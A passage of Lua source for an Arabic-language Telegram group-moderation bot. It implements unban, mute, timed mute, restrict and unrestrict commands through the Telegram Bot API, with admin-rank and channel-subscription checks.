if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
if tonumber(result.id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, ' ⋄بس عبط \n') 
return false 
end
database:srem(bot_id..'Ban:User'..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم الغاء حظره'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^الغاء حظر (%d+)$") and Mod(msg) then
local userid = text:match("^الغاء حظر (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if tonumber(userid) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, ' ⋄انا لست محظورآ \n') 
return false 
end
database:srem(bot_id..'Ban:User'..msg.chat_id_, userid)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم الغاء حظره'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم الغاء حظره'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end
------------------------------------------------------------------------
if text == 'مسح المكتومين' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
database:del(bot_id..'Muted:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' ⋄تم مسح المكتومين')
end
if text == ("المكتومين") then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
local list = database:smembers(bot_id..'Muted:User'..msg.chat_id_)
t = "\n⋄قائمة المكتومين \n•┉ • ┉ • ┉ Joker ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " ⋄لا يوجد مكتومين"
end
send(msg.chat_id_, msg.id_, t)
end

if text == ("كتم") and msg.reply_to_message_id_ ~= 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع كتم البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n⋄عذرا لا تستطيع كتم ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ⋄البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
database:sadd(bot_id..'Muted:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم كتمه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^كتم @(.*)$") and Mod(msg) then
local username = text:match("^كتم @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع كتم البوت ")
return false 
end
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n⋄عذرا لا تستطيع كتم ( '..Rutba(result.id_,msg.chat_id_)..' )')
else  
database:sadd(bot_id..'Muted:User'..msg.chat_id_, result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم كتمه'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
end
else
send(msg.chat_id_, msg.id_, ' ⋄لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
if text and text:match('^كتم (%d+) (.*)$') and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
local TextEnd = {string.match(text, "^(كتم) (%d+) (.*)$")}
function start_function(extra, result, success)
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n⋄عذرا لا تستطيع كتم ( "..Rutba(result.sender_user_id_,msg.chat_id_).." )")
else
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم كتم لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+Time))
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end


if text and text:match('^كتم (%d+) (.*) @(.*)$') and Mod(msg) then
local TextEnd = {string.match(text, "^(كتم) (%d+) (.*) @(.*)$")}
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Can_or_NotCan(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n⋄عذرا لا تستطيع كتم ( "..Rutba(result.id_,msg.chat_id_).." )")
else
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم كتم لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_..'&until_date='..tonumber(msg.date_+Time))
end
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = TextEnd[4]}, start_function, nil)
return false
end
if text and text:match("^كتم (%d+)$") and Mod(msg) then
local userid = text:match("^كتم (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع كتم البوت ")
return false 
end
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n⋄عذرا لا تستطيع كتم ( '..Rutba(userid,msg.chat_id_)..' )')
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' ⋄البوت ليس ادمن يرجى ترقيتي !') 
return false  
end
database:sadd(bot_id..'Muted:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم كتمه'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم كتمه'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
return false
end
if text == ("الغاء كتم") and msg.reply_to_message_id_ then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
database:srem(bot_id..'Muted:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم الغاء كتمه'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^الغاء كتم @(.*)$") and Mod(msg) then
local username = text:match("^الغاء كتم @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:srem(bot_id..'Muted:User'..msg.chat_id_, result.id_)
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم الغاء كتمه'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match("^الغاء كتم (%d+)$") and Mod(msg) then
local userid = text:match("^الغاء كتم (%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
database:srem(bot_id..'Muted:User'..msg.chat_id_, userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم الغاء كتمه'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم الغاء كتمه'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
return false
end

if text == ("تقيد") and msg.reply_to_message_id_ then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع تقيد البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n⋄عذرا لا تستطيع تقيد ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تقيده'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^تقيد @(.*)$") and Mod(msg) then
local username = text:match("^تقيد @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
if tonumber(result.id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع تقيد البوت ")
return false 
end
if Can_or_NotCan(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n⋄عذرا لا تستطيع تقيد ( '..Rutba(result.id_,msg.chat_id_)..' )')
return false 
end      
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_)
 
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم تقيده'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text and text:match('^تقيد (%d+) (.*)$') and tonumber(msg.reply_to_message_id_) ~= 0 and Mod(msg) then
local TextEnd = {string.match(text, "^(تقيد) (%d+) (.*)$")}
function start_function(extra, result, success)
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n⋄عذرا لا تستطيع تقيد ( "..Rutba(result.sender_user_id_,msg.chat_id_).." )")
else
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تقيده لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+Time))
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end


if text and text:match('^تقيد (%d+) (.*) @(.*)$') and Mod(msg) then
local TextEnd = {string.match(text, "^(تقيد) (%d+) (.*) @(.*)$")}
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
if TextEnd[3] == 'يوم' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 86400
end
if TextEnd[3] == 'ساعه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 3600
end
if TextEnd[3] == 'دقيقه' then
Time_Restrict = TextEnd[2]:match('(%d+)')
Time = Time_Restrict * 60
end
TextEnd[3] = TextEnd[3]:gsub('دقيقه',"دقايق") 
TextEnd[3] = TextEnd[3]:gsub('ساعه',"ساعات") 
TextEnd[3] = TextEnd[3]:gsub("يوم","ايام") 
if Can_or_NotCan(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, "\n⋄عذرا لا تستطيع تقيد ( "..Rutba(result.id_,msg.chat_id_).." )")
else
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم تقيده لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.id_..'&until_date='..tonumber(msg.date_+Time))
end
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = TextEnd[4]}, start_function, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^تقيد (%d+)$") and Mod(msg) then
local userid = text:match("^تقيد (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
if tonumber(userid) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " ⋄لا تسطيع تقيد البوت ")
return false 
end
if Can_or_NotCan(userid, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n⋄عذرا لا تستطيع تقيد ( '..Rutba(userid,msg.chat_id_)..' )')
else
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..userid)
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم تقيده'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n⋄العضو »> '..userid..''
status  = '\n⋄تم تقيده'
send(msg.chat_id_, msg.id_, usertext..status)
end;end,nil)
end
return false
end
------------------------------------------------------------------------
if text == ("الغاء تقيد") and msg.reply_to_message_id_ then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.sender_user_id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n⋄العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'SOPOWERB0T')..')'
status  = '\n⋄تم الغاء تقيد'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^الغاء تقيد @(.*)$") and Mod(msg) then
local username = text:match("^الغاء تقيد @(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
local teexxt = '⋄اهلا عزيزي \n⋄لا تستطيع استخدام البوت \n⋄يرجى الاشتراك بالقناه اولا \n⋄اشترك هنا [@'..ch..']'
if textchuser then
send_inline_key(msg.chat_id_,textchuser,nil,inline,msg.id_/2097152/0.5)
else
send_inline_key(msg.chat_id_,teexxt,nil,inline,msg.id_/2097152/0.5)
end
return false
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"⋄عذرا عزيزي هاذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" .. result.id_ .. "&can_send_messages=True&can_send_media_messages=True&can_send_other_messages=True&can_add_web_page_previews=True")
usertext = '\n⋄العضو »> ['..result.title_..'](t.me/'..(username or 'SOPOWERB0T')..')'
status  = '\n⋄تم الغاء تقيد'
texts = usertext..status
else
texts = ' ⋄لا يوجد حساب بهاذا المعرف'
end
send(msg.chat_id_, msg.id_, texts)
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end
------------------------------------------------------------------------
if text and text:match("^الغاء تقيد (%d+)$") and Mod(msg) then
local userid = text:match("^الغاء تقيد (%d+)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
local ch = database:get(bot_id..'add:ch:username')
local chid = database:get(bot_id..'add:ch:id')
local url , res = https.request('https://api.telegram.org/bot'..token..'/getchat?chat_id='..chid)
local json = JSON.decode(url)
local inline = {{{text = json.result.title, url="t.me/"..ch}},} 
